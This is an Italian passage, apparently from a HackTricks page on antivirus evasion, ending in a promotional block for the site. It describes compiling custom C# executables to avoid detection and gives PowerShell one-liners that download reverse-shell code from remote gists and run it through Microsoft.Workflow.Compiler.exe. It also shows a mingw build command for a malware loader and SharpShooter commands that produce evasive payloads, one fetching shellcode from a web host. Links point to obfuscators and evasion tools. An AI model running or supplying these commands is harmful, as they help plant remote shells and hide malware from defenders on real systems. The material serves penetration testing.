In alcuni casi, è possibile bypassare i sistemi di rilevamento delle minacce utilizzando il compilatore C#. Questo metodo sfrutta il fatto che molti sistemi di sicurezza si basano sulla rilevazione di file eseguibili o script noti. Utilizzando il compilatore C#, è possibile creare un file eseguibile personalizzato che non viene riconosciuto come minaccia.

Ecco come eseguire questa tecnica:

1. Aprire un editor di testo e creare un nuovo file con estensione ".cs" (ad esempio, "bypass.cs").
2. Inserire il codice C# desiderato nel file. Assicurarsi che il codice non contenga alcuna funzionalità sospetta che potrebbe attirare l'attenzione dei sistemi di sicurezza.
3. Aprire una finestra del prompt dei comandi e passare alla directory in cui si trova il file ".cs".
4. Utilizzare il compilatore C# per compilare il file in un eseguibile. Il comando da utilizzare è `csc bypass.cs`.
5. Una volta compilato con successo, verrà generato un file eseguibile con lo stesso nome del file ".cs" (ad esempio, "bypass.exe").
6. Eseguire il file eseguibile personalizzato utilizzando il comando `bypass.exe`.

Utilizzando questa tecnica, è possibile creare un file eseguibile personalizzato che potrebbe bypassare i sistemi di rilevamento delle minacce. Tuttavia, è importante notare che questa tecnica potrebbe non funzionare su tutti i sistemi di sicurezza e potrebbe essere considerata una violazione delle politiche di sicurezza.
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e esecuzione automatica:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Elenco degli obfuscatori C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Altro

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
